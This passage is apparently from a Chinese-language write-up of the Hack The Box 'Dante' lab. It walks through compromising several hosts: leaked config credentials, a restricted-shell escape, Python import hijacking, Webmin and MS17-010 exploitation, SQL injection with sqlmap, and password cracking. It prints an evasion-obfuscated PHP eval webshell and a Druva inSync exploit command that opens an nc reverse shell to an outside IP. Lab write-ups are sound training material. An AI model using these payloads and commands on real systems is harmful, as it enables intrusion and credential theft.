class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The base configuration for WordPress</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The wp-config.php creation script uses this file during the</span></span><br><span class="line"><span class="comment"> * installation. You don&#x27;t have to use the web site, you can</span></span><br><span class="line"><span class="comment"> * copy this file to &quot;wp-config.php&quot; and fill in the values.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This file contains the following configurations:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * * MySQL settings</span></span><br><span class="line"><span class="comment"> * * Secret keys</span></span><br><span class="line"><span class="comment"> * * Database table prefix</span></span><br><span class="line"><span class="comment"> * * ABSPATH</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@link</span> https://wordpress.org/support/article/editing-wp-config-php/</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@package</span> WordPress</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ** MySQL settings - You can get this info from your web host ** //</span></span><br><span class="line"><span class="comment">/** The name of the database for WordPress */</span></span><br><span class="line"><span class="title function_ invoke__">define</span>( <span class="string">&#x27;DB_NAME&#x27;</span> <span class="string">&#x27;wordpress&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">/** MySQL database username */</span></span><br><span class="line"><span class="title function_ invoke__">define</span>( <span class="string">&#x27;DB_USER&#x27;</span>, <span class="string">&#x27;margaret&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">/** MySQL database password */</span></span><br><span class="line"><span class="title function_ invoke__">define</span>( <span class="string">&#x27;DB_PASSWORD&#x27;</span>, <span class="string">&#x27;Welcome1!2@3#&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">/** MySQL hostname */</span></span><br><span class="line"><span class="title function_ invoke__">define</span>( <span class="string">&#x27;DB_HOST&#x27;</span>, <span class="string">&#x27;localhost&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Database Charset to use in creating database tables. */</span></span><br><span class="line"><span class="title function_ invoke__">define</span>( <span class="string">&#x27;DB_CHARSET&#x27;</span>, <span class="string">&#x27;utf8&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">/** The Database Collate type. Don&#x27;t change this if in doubt. */</span></span><br><span class="line"><span class="title function_ invoke__">define</span>( <span class="string">&#x27;DB_COLLATE&#x27;</span>, <span class="string">&#x27;&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">/**#@+</span></span><br><span class="line"><span class="comment"> * Authentication Unique Keys and Salts.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Change these to different unique phrases!</span></span><br><span class="line"><span class="comment"> * You can generate these using the &#123;<span class="doctag">@link</span> https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service&#125;</span></span><br><span class="line"><span class="comment"> * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2.6.0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="title function_ invoke__">define</span>( <span class="string">&#x27;AUTH_KEY&#x27;</span>,         <span class="string">&#x27;put your unique phrase here&#x27;</span> );</span><br><span class="line"><span class="title function_ invoke__">define</span>( <span class="string">&#x27;SECURE_AUTH_KEY&#x27;</span>,  <span class="string">&#x27;put your unique phrase here&#x27;</span> );</span><br><span class="line"><span class="title function_ invoke__">define</span>( <span class="string">&#x27;LOGGED_IN_KEY&#x27;</span>,    <span class="string">&#x27;put your unique phrase here&#x27;</span> );</span><br><span class="line"><span class="title function_ invoke__">define</span>( <span class="string">&#x27;NONCE_KEY&#x27;</span>,        <span class="string">&#x27;put your unique phrase here&#x27;</span> );</span><br><span class="line"><span class="title function_ invoke__">define</span>( <span class="string">&#x27;AUTH_SALT&#x27;</span>,        <span class="string">&#x27;put your unique phrase here&#x27;</span> );</span><br><span class="line"><span class="title function_ invoke__">define</span>( <span class="string">&#x27;SECURE_AUTH_SALT&#x27;</span>, <span class="string">&#x27;put your unique phrase here&#x27;</span> );</span><br><span class="line"><span class="title function_ invoke__">define</span>( <span class="string">&#x27;LOGGED_IN_SALT&#x27;</span>,   <span class="string">&#x27;put your unique phrase here&#x27;</span> );</span><br><span class="line"><span class="title function_ invoke__">define</span>( <span class="string">&#x27;NONCE_SALT&#x27;</span>,       <span class="string">&#x27;put your unique phrase here&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">/**#@-*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * WordPress Database Table prefix.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * You can have multiple installations in one database if you give each</span></span><br><span class="line"><span class="comment"> * a unique prefix. Only numbers, letters, and underscores please!</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="variable">$table_prefix</span> = <span class="string">&#x27;wp_&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * For developers: WordPress debugging mode.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Change this to true to enable the display of notices during development.</span></span><br><span class="line"><span class="comment"> * It is strongly recommended that plugin and theme developers use WP_DEBUG</span></span><br><span class="line"><span class="comment"> * in their development environments.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * For information on other constants that can be used for debugging,</span></span><br><span class="line"><span class="comment"> * visit the documentation.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@link</span> https://wordpress.org/support/article/debugging-in-wordpress/</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="title function_ invoke__">define</span>( <span class="string">&#x27;WP_DEBUG&#x27;</span>, <span class="literal">false</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">/* That&#x27;s all, stop editing! Happy publishing. */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/** Absolute path to the WordPress directory. */</span></span><br><span class="line"><span class="keyword">if</span> ( ! <span class="title function_ invoke__">defined</span>( <span class="string">&#x27;ABSPATH&#x27;</span> ) ) &#123;</span><br><span class="line">        <span class="title function_ invoke__">define</span>( <span class="string">&#x27;ABSPATH&#x27;</span>, <span class="keyword">__DIR__</span> . <span class="string">&#x27;/&#x27;</span> );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Sets up WordPress vars and included files. */</span></span><br><span class="line"><span class="keyword">require_once</span> ABSPATH . <span class="string">&#x27;wp-settings.php&#x27;</span>;</span><br></pre></td></tr></table></figure><p>得到一组帐号密码：margaret:Welcome1!2@3#，还记得我们之前在&#x2F;etc&#x2F;passwd看到的那个账户吗？之后我们就通过ssh来连上去：</p><p><a href="https://pic.imgdb.cn/item/6461e7f70d2dde5777d9ae9a.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6461e7f70d2dde5777d9ae9a.jpg"></a></p><p>提示我们当前处于受限制的shell中，那接下来就是逃逸lshell了。通过google，我找到了一种逃逸方法，首先进入vim，之后执行下面两句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">:set shell=/bin/bash</span><br><span class="line">:shell</span><br></pre></td></tr></table></figure><p>之后我们就得到了&#x2F;bin&#x2F;bash这个shell了：</p><p><a href="https://pic.imgdb.cn/item/6461e8b30d2dde5777dab5e8.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6461e8b30d2dde5777dab5e8.jpg"></a></p><p>之后cat flag.txt又拿到了一个flag。</p><h3 id="Snake-it-‘til-you-make-it"><a href="#Snake-it-‘til-you-make-it" class="headerlink" title="Snake it ‘til you make it"></a>Snake it ‘til you make it</h3><p>在margaret的用户目录下，存在一个.config目录，进入.config目录，发现使用了Slack，关于Slack的信息师傅们可以自行百度。可以找到缓存的文件~&#x2F;.config&#x2F;Slack&#x2F;exported_data&#x2F;secure&#x2F;2020-05-18.json，里面有一些Frank和Margaret的对话，通过对话可以推理得知，这台机器正是迁移之后的ubuntu镜像主机，而frank的密码TractorHeadtorchDeskmat在缓存文件里面也被Margaret说出，我们直接看这里：</p><p><a href="https://pic.imgdb.cn/item/6461ea9e0d2dde5777dce569.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6461ea9e0d2dde5777dce569.jpg"></a></p><p>之后我们登录上frank：</p><p><a href="https://pic.imgdb.cn/item/6461eac90d2dde5777dd10aa.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6461eac90d2dde5777dd10aa.jpg"></a></p><p>上传pspy并运行，可以看到有这么一个进程：</p><p><a href="https://pic.imgdb.cn/item/6461eb600d2dde5777ddad21.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6461eb600d2dde5777ddad21.jpg"></a></p><p>在pspy中，我们发现这个进程每隔一段时间就会启动，并且是UID&#x3D;0（root）来启动这个进程。但是我们不能直接修改apache_restart.py，因为权限不够：</p><p><a href="https://pic.imgdb.cn/item/6461ecb90d2dde5777df4d44.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6461ecb90d2dde5777df4d44.jpg"></a></p><p>那就看一下apache_restart.py的内容吧：</p><p><a href="https://pic.imgdb.cn/item/6461edc30d2dde5777e0c31d.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6461edc30d2dde5777e0c31d.jpg"></a></p><p>接下来想要提权，首先我们需要了解python导包的搜索顺序：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">在当前目录下搜索该模块</span><br><span class="line">在环境变量 PYTHONPATH 中指定的路径列表中依次搜索</span><br><span class="line">在 Python 安装路径的 lib 库中搜索</span><br></pre></td></tr></table></figure><p>虽然我们不能直接修改apache_restart.py，但是我们可以在&#x2F;home&#x2F;frank的路径下面添加py包呢。因此提权思路就是，在&#x2F;home&#x2F;frank的目录下添加一个urllib.py，内容可以是反弹shell，也可以是别的，只要你能拿到root的shell即可，我这里是给&#x2F;bin&#x2F;bash设置suid位：</p><p><a href="https://pic.imgdb.cn/item/6461ee730d2dde5777e18bc0.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6461ee730d2dde5777e18bc0.jpg"></a></p><p>之后&#x2F;bin&#x2F;bash -p就拿到root权限了，可以看flag了：</p><p><a href="https://pic.imgdb.cn/item/6462b0890d2dde577711d4be.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6462b0890d2dde577711d4be.jpg"></a></p><p>至此DANTE-NIX02也打完了。</p><h3 id="Feeling-fintastic"><a href="#Feeling-fintastic" class="headerlink" title="Feeling fintastic"></a>Feeling fintastic</h3><p>接下来我们看172.16.1.17，fscan扫出来的开放的端口是80、139、445以及10000。10000端口是webmin服务，对，就是漏洞多的yp的那个。但是没帐号密码，拿不到shell。开放了445端口，尝试smbclient连一下看看能不能拿到什么信息？</p><p><a href="https://pic.imgdb.cn/item/6461efca0d2dde5777e69fb2.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6461efca0d2dde5777e69fb2.jpg"></a></p><p>有一个forensics目录共享，<code>proxychains4 smbclient \\\\172.16.1.17\\forensics</code>：</p><p><a href="https://pic.imgdb.cn/item/6461f2c30d2dde5777f076d7.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6461f2c30d2dde5777f076d7.jpg"></a></p><p>存在一个文件名叫monitor的文件，把它下载下来，发现是一个流量包，wireshark分析一下：</p><p><a href="https://pic.imgdb.cn/item/6461f0b90d2dde5777ea2799.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6461f0b90d2dde5777ea2799.jpg"></a></p><p>可以看到上面这块通过POST请求&#x2F;session_login.cgi之后就GET请求&#x2F;，猜测此处的POST请求登录成功了，那就看一下有没有密码：</p><p><a href="https://pic.imgdb.cn/item/6461f0ff0d2dde5777eaec4a.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6461f0ff0d2dde5777eaec4a.jpg"></a></p><p>得到一组帐号密码<code>admin:Password6543</code>，之后去登录10000端口处的webmin服务，发现可以成功登录。之后就是用msf的exploit&#x2F;linux&#x2F;http&#x2F;webmin_packageup_rce模块来拿到meterpreter了：</p><p><a href="https://pic.imgdb.cn/item/6461f2a00d2dde5777f02438.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6461f2a00d2dde5777f02438.jpg"></a></p><p>直接就是root权限，DANTE-NIX03也打完了。</p><h3 id="Let’s-take-this-discussion-elsewhere"><a href="#Let’s-take-this-discussion-elsewhere" class="headerlink" title="Let’s take this discussion elsewhere"></a>Let’s take this discussion elsewhere</h3><p>接下来我们看172.16.1.13，fscan的扫描结果显示开放的端口为80、443、445，进入80端口，是一个XAMPP的欢迎界面：</p><p><a href="https://pic.imgdb.cn/item/646209df0d2dde57772602b8.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/646209df0d2dde57772602b8.jpg"></a></p><p>smbclient也连不上，443端口也跟80端口界面一样，那接下来就爆破一下80端口的web目录吧：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/rainb0w/tools/pspy-master]</span><br><span class="line">└─# dirsearch -u http://172.16.1.13/ -t 200 -x 404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --proxy=socks5://127.0.0.1:1080 </span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.4.2                                                                                                                                                                                                 </span><br><span class="line"> (_||| _) (/_(_|| (_| )                                                                                                                                                                                                          </span><br><span class="line">                                                                                                                                                                                                                                 </span><br><span class="line">Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 200 | Wordlist size: 220545</span><br><span class="line"></span><br><span class="line">Output File: /root/.dirsearch/reports/172.16.1.13/-_23-05-15_06-32-14.txt</span><br><span class="line"></span><br><span class="line">Error Log: /root/.dirsearch/logs/errors-23-05-15_06-32-14.log</span><br><span class="line"></span><br><span class="line">Target: http://172.16.1.13/</span><br><span class="line"></span><br><span class="line">[06:32:15] Starting: </span><br><span class="line">[06:32:17] 301 -  332B  - /img  -&gt;  http://172.16.1.13/img/                </span><br><span class="line">[06:32:20] 301 -  336B  - /discuss  -&gt;  http://172.16.1.13/discuss/        </span><br><span class="line">[06:32:23] 403 -    1KB - /licenses                                        </span><br><span class="line">[06:32:28] 301 -  338B  - /dashboard  -&gt;  http://172.16.1.13/dashboard/    </span><br><span class="line">[06:32:32] 403 -    1KB - /%20                                             </span><br><span class="line">[06:32:32] 301 -  332B  - /IMG  -&gt;  http://172.16.1.13/IMG/                </span><br><span class="line">[06:32:49] 403 -    1KB - /*checkout*                                      </span><br><span class="line">[06:32:57] 301 -  332B  - /Img  -&gt;  http://172.16.1.13/Img/                </span><br><span class="line">[06:33:07] 403 -    1KB - /phpmyadmin                                      </span><br><span class="line">[06:33:25] 403 -    1KB - /webalizer                                       </span><br><span class="line">[06:33:32] 403 -    1KB - /*docroot*                                       </span><br><span class="line">[06:33:36] 403 -    1KB - /*                                               </span><br><span class="line">[06:33:45] 403 -    1KB - /con                                             </span><br><span class="line">[06:33:54] 301 -  338B  - /Dashboard  -&gt;  http://172.16.1.13/Dashboard/    </span><br><span class="line">[06:34:56] 403 -    1KB - /http%3A                                          </span><br><span class="line">[06:35:16] 403 -    1KB - /**http%3a                                        </span><br><span class="line">[06:35:34] 403 -    1KB - /*http%3A                                         </span><br><span class="line">[06:35:36] 301 -  334B  - /xampp  -&gt;  http://172.16.1.13/xampp/             </span><br><span class="line">[06:36:18] 403 -    1KB - /aux                                              </span><br><span class="line">[06:36:59] 403 -    1KB - /**http%3A                                        </span><br><span class="line">[06:37:47] 403 -    1KB - /%C0                                              </span><br><span class="line">[06:40:35] 403 -    1KB - /server-status                                    </span><br><span class="line">[06:41:24] 403 -    1KB - /%3FRID%3D2671</span><br></pre></td></tr></table></figure><p>利用dirsearch爆破除了个&#x2F;discuss目录，进入之后，界面是这样的：</p><p><a href="https://pic.imgdb.cn/item/64620ac20d2dde5777278c1c.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/64620ac20d2dde5777278c1c.jpg"></a></p><p>google一下之后，可以找到利用方法：<a href="https://www.exploit-db.com/exploits/48512">https://www.exploit-db.com/exploits/48512</a>。接下来我们开始注册，在注册上传头像那里直接上传webshell，只是这里似乎存在免杀？直接上传一句话webshell无法上传成功，因此尝试绕过：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">&amp;<span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$var</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">foo</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>一个很简单的免杀就绕过了，之后会显示注册成功的界面：</p><p><a href="https://pic.imgdb.cn/item/64620c650d2dde57772ae1d1.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/64620c650d2dde57772ae1d1.jpg"></a></p><p>注册成功之后，进入&#x2F;discuss&#x2F;ups可以看到我们的webshell，蚁剑连接之后拿到shell（注意给蚁剑配置代理哦)。之后可以在<code>C:\Users\Gerald\Desktop</code>目录下看到flag。</p><h3 id="Compare-my-numbers"><a href="#Compare-my-numbers" class="headerlink" title="Compare my numbers"></a>Compare my numbers</h3><p>当前拿到的shell是gerald用户的，接下来开始提权。 进入<code>C:\Program Files (x86)</code>之后可以看到存在一个Druva的目录：</p><p>在Druva inSync的windows客户端6.6.3版本中，存在相对路径遍历允许未经身份验证的本地攻击者以 SYSTEM 权限执行任意操作系统命令的漏洞。因此searchsploit搜索这个漏洞：</p><p><a href="https://pic.imgdb.cn/item/64620ece0d2dde57772dd33a.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/64620ece0d2dde57772dd33a.jpg"></a></p><p>把48505.txt的后缀改为.py，将其和nc一起上传到靶机上，然后执行如下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Python27\python.exe 48505.py &quot;windows\system32\cmd.exe /C C:\xampp\htdocs\discuss\ups\nc64.exe 10.10.14.2 1237 -e cmd.exe&quot;</span><br></pre></td></tr></table></figure><p>成功反弹到shell，此时权限为system，DANTE-WS01也成功打完：</p><p><a href="https://pic.imgdb.cn/item/646211080d2dde577730487f.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/646211080d2dde577730487f.jpg"></a></p><h3 id="Again-and-again"><a href="#Again-and-again" class="headerlink" title="Again and again"></a>Again and again</h3><p>接下来我们看172.16.1.12，开放的端口有21、22、80、443以及3306。访问web界面，发现与172.16.1.13的界面一样，都是XAMPP的欢迎界面。尝试爆破目录，爆破出&#x2F;blog目录。使用了Responsive Blog：</p><p><a href="https://pic.imgdb.cn/item/646212280d2dde577731e0fe.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/646212280d2dde577731e0fe.jpg"></a></p><p>google一下找到了存在的漏洞，即<code>http://172.16.1.12/blog/category.php?id=1</code>此处存在sql注入，直接sqlmap一把梭：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://172.16.1.12/blog/category.php?id=1&quot; --proxy=socks5://127.0.0.1:1080 --dbs --batch</span><br><span class="line"></span><br><span class="line">available databases [7]:                                                                                                                                                                             </span><br><span class="line">[*] blog_admin_db</span><br><span class="line">[*] flag</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] mysql</span><br><span class="line">[*] performance_schema</span><br><span class="line">[*] phpmyadmin</span><br><span class="line">[*] test</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>flag在flag数据库内。</p><h3 id="Five-doctors"><a href="#Five-doctors" class="headerlink" title="Five doctors"></a>Five doctors</h3><p>之后爆blog_admin_db库：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Database: blog_admin_db                                                                                                                                                                              </span><br><span class="line">[13 tables]</span><br><span class="line">+-----------------------------+</span><br><span class="line">| banner_posts                |</span><br><span class="line">| blog_categories             |</span><br><span class="line">| blogs                       |</span><br><span class="line">| editors_choice              |</span><br><span class="line">| links                       |</span><br><span class="line">| membership_grouppermissions |</span><br><span class="line">| membership_groups           |</span><br><span class="line">| membership_userpermissions  |</span><br><span class="line">| membership_userrecords      |</span><br><span class="line">| membership_users            |</span><br><span class="line">| page_hits                   |</span><br><span class="line">| titles                      |</span><br><span class="line">| visitor_info                |</span><br><span class="line">+-----------------------------+</span><br></pre></td></tr></table></figure><p>membership_users表的部分字段爆破结果如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">+---------+----------+----------------+------------------------------------------+</span><br><span class="line">| groupID | memberID | email          | passMD5                                  |</span><br><span class="line">+---------+----------+----------------+------------------------------------------+</span><br><span class="line">| 2       | admin    | &lt;blank&gt;        | 21232f297a57a5a743894a0e4a801fc3 (admin) |</span><br><span class="line">| NULL    | ben      | ben@dante.htb  | 442179ad1de9c25593cabf625c0badb7         |</span><br><span class="line">| 3       | egre55   | egre55@htb.com | d6501933a2e0ea1f497b87473051417f         |</span><br><span class="line">| 1       | guest    | NULL           | NULL                                     |</span><br><span class="line">+---------+----------+----------------+------------------------------------------+</span><br></pre></td></tr></table></figure><p>将这三个hash保存在一个文件里，然后john爆破，以下是爆破结果：</p><p><a href="https://pic.imgdb.cn/item/6462138b0d2dde577733498e.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6462138b0d2dde577733498e.jpg"></a></p><p>得到了ben用户的密码，那看看ssh能不能再用这个密码连上去：</p><p><a href="https://pic.imgdb.cn/item/646213e20d2dde5777339a6e.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/646213e20d2dde5777339a6e.jpg"></a></p><p>可以连接上去，在当前目录下可以拿到flag。</p><h3 id="Minus-minus-plus"><a href="#Minus-minus-plus" class="headerlink" title="Minus + minus &#x3D; plus?"></a>Minus + minus &#x3D; plus?</h3><p>之后执行一下sudo -l看看能用sudo执行哪些命令：</p><p><a href="https://pic.imgdb.cn/item/646214600d2dde57773414db.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/646214600d2dde57773414db.jpg"></a></p><p>这个意思是指我们可以以任何人除了root的权限执行bash，而执行sudo –version可以看到sudo的版本为1.8.27，因此提权方式为sudo 1.8.27 - Security Bypass，执行<code>sudo -u#-1 /bin/bash</code>，可以以root权限执行任意命令：</p><p><a href="https://pic.imgdb.cn/item/6462b0c10d2dde577711fae0.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6462b0c10d2dde577711fae0.jpg"></a></p><p>与此同时，我们可以发现在系统中还存在一个julian用户，尝试读取&#x2F;etc&#x2F;shadow，并用john爆破得到密码，得到一对帐号密码：julian:manchesterunited，相信我，这个密码会在后面用到。至此，DANTE-NIX04也成功getroot。</p><h3 id="Congratulations-to-a-perfect-pear"><a href="#Congratulations-to-a-perfect-pear" class="headerlink" title="Congratulations to a perfect pear"></a>Congratulations to a perfect pear</h3><p>之后我们看172.16.1.102，开放了80、135、139、443、445以及3306端口。在网站的下方我们可以看到这个站使用了<code>Online Marriage Registration System</code>：</p><p><a href="https://pic.imgdb.cn/item/64622a690d2dde57774e73ed.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/64622a690d2dde57774e73ed.jpg"></a></p><p>之后使用searchsploit来搜索这个框架，找到了一些POC：</p><p><a href="https://pic.imgdb.cn/item/64622b370d2dde57774f3bbf.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/64622b370d2dde57774f3bbf.jpg"></a></p><p>随便拉取一个POC来打：</p><p><a href="https://pic.imgdb.cn/item/64622bf80d2dde577750042c.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/64622bf80d2dde577750042c.jpg"></a></p><p>此时已经上传好了webshell了，只不过webshell的格式蚁剑连不上，依然把上面免杀之后的马上传，然后蚁剑连接即可：</p><p><a href="https://pic.imgdb.cn/item/64622d1b0d2dde577751800b.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/64622d1b0d2dde577751800b.jpg"></a></p><p><a href="https://pic.imgdb.cn/item/64622d320d2dde577751aad9.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/64622d320d2dde577751aad9.jpg"></a></p><p>flag在blake桌面目录下的flag.txt中</p><h3 id="MinatoTW-strikes-again"><a href="#MinatoTW-strikes-again" class="headerlink" title="MinatoTW strikes again"></a>MinatoTW strikes again</h3><p>接着上传一个利用msfvenom生成的马，然后执行得到一个meterpreter，得到meterpreter之后直接getsystem拿到system权限：</p><p><a href="https://pic.imgdb.cn/item/64622e460d2dde577752f4d7.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/64622e460d2dde577752f4d7.jpg"></a></p><p>至此DANTE-WS03也打完了。</p><h3 id="That-just-blew-my-mind"><a href="#That-just-blew-my-mind" class="headerlink" title="That just blew my mind"></a>That just blew my mind</h3><p>接下来看172.16.1.20，fscan扫描结果显示开放了22、80、135、139、443、445以及88端口。既然开放了88端口，那有可能是一台域控。fscan还显示存在ms17-010漏洞，那么用直接msf打就可以了：</p><p><a href="https://pic.imgdb.cn/item/6461e3130d2dde5777d3369d.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6461e3130d2dde5777d3369d.jpg"></a></p><p>拿到meterpreter之后，直接就是system权限。之后我们会在katwamba的桌面目录下看到一个叫职工备份的xlsx文件：</p><p><a href="https://pic.imgdb.cn/item/64623af10d2dde577764df8d.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/64623af10d2dde577764df8d.jpg"></a></p><p>我们把它下载下来：</p><p><a href="https://pic.imgdb.cn/item/64623b4c0d2dde577765afd0.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/64623b4c0d2dde577765afd0.jpg"></a></p><p>观察这里，B列被隐藏了：</p><p><a href="https://pic.imgdb.cn/item/64623be40d2dde577766f146.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/64623be40d2dde577766f146.jpg"></a></p><p>我们将它还原出后，可以得到A列username，B列password。对了，执行<code>net user mrb3n</code>有惊喜哦。之后我们通过调用msf的kiwi模块可以抓取到一对帐号密码，<code>xadmin:Peacemaker!</code>，还是一个域管。不过令人悲伤的是，dante.local这个域中似乎只有DANTE-DC01这一台机子了，以下是通过ldapsearch搜索得到的结果：</p><figure class="highlight 